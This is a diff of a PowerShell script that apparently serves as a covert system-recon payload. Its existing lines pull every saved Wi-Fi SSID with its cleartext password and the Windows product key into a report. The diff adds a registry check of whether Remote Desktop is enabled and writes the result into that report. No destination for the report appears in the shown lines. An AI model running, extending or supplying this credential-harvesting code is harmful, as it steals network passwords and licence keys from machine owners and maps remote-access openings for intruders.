@@ -28,6 +28,14 @@ $wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$nam
 $wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ssid=$name;pass=$pass }} | Format-Table -AutoSize | Out-String
 
 
+# ----------------- CHECK RDP STATUS
+
+if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
+	$RDP = "Enabled" 
+} else {
+	$RDP = "Disabled" 
+}
+
 
 # ----------------- CAPS OFF !
 Add-Type -AssemblyName System.Windows.Forms
@@ -97,6 +105,10 @@ Wi-Fi Profiles and Passwords:
 ----------------------------------- 
 " + $wifiProfiles_IT + $wifiProfiles_EN + "
   
+Remote Desktop Status
+----------------------------------- 
+RDP: " + $RDP + "
+
 Windows Serial
 ----------------------------------- 
 S/N: " + $seriale.BackupProductKeyDefault + "
